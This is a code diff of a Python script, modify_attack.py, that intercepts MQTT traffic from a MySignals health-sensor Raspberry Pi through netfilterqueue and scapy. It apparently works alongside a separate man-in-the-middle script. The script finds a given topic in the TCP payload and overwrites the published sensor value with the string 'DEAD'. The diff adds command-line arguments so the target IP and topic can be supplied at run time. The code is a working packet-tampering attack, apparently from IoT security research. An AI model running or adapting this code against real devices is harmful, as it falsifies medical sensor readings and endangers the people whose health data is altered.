@@ -1,20 +1,22 @@
 from netfilterqueue import NetfilterQueue
 import scapy.all as scapy
 import os
+import sys
 
-TARGET_IP       =   '192.168.1.160'   # Raspberry Pi w/ MySignals
-TOPIC           =   'MySignals/Temp'  # Target topic to modify
-
+TARGET_IP       =   ''   # Raspberry Pi w/ MySignals
+TOPIC           =   ''  # Target topic to modify
 
 # -----------------------------------------------------------------------------
 # Filter and Forward Packets
 # -----------------------------------------------------------------------------
 def pkt_handler(payload):
+
+    global TARGET_IP
+    global TOPIC
+
     # Convert to scapy packet
     data = payload.get_payload()
     pkt = scapy.IP(data)
-    #pkt2 = scapy.Ether(data)
-    #pkt.show()
 
     # Found topic in tcp payload
     if pkt.src == TARGET_IP:
@@ -24,12 +26,24 @@ def pkt_handler(payload):
             # Copy TCP and IP headers
             ip, tcp = cpy_tcp_ip(pkt)
 
-            # Modify payload
+            # Find start, end, and length of payload
+            topic_pos = mqtt.find(TOPIC)
+            payload_start = topic_pos + len(TOPIC)
+            payload_end = len(mqtt) - 4
+            payload_len = payload_end - payload_start + 1
+
+            # Modify payload to be DEAD
             byte_payload = bytes(pkt[scapy.TCP].payload)
             list_payload = list(byte_payload)
-            list_payload[len(list_payload)-2] = 60
-            byte_payload = bytes(list_payload)
 
+            bogus_payload = [68, 65, 69, 68]
+            for i in range(payload_len):
+                if i < len(bogus_payload):
+                    list_payload[len(list_payload) - (i + 2)] = bogus_payload[i]
+                else:
+                    list_payload[len(list_payload) - (i + 2)] = 32
+
+            byte_payload = bytes(list_payload)
             new_payload = byte_payload
 
             # Replace pkt with new pkt
@@ -78,16 +92,21 @@ def cpy_tcp_ip(pkt):
 
     return cpy_ip, cpy_tcp
 
-# Default Tables
-#  -P INPUT ACCEPT
-#  -P FORWARD ACCEPT
-#  -P OUTPUT ACCEPT
-
 # -----------------------------------------------------------------------------
 # Main
 # Should be run with mitm.py
 # -----------------------------------------------------------------------------
 def main():
+
+    if(len(sys.argv) != 3):
+        print('error, sample invocation is: $python3 modify_attack.py <target_address> <topic>')
+        sys.exit(-1)
+
+    global TARGET_IP
+    global TOPIC
+
+    TARGET_IP = sys.argv[1]           # Client address
+    TOPIC = sys.argv[2]            # Broker Topic
 
     # Save iptables rules for restore afterwards
     print('[*] Saving iptables')
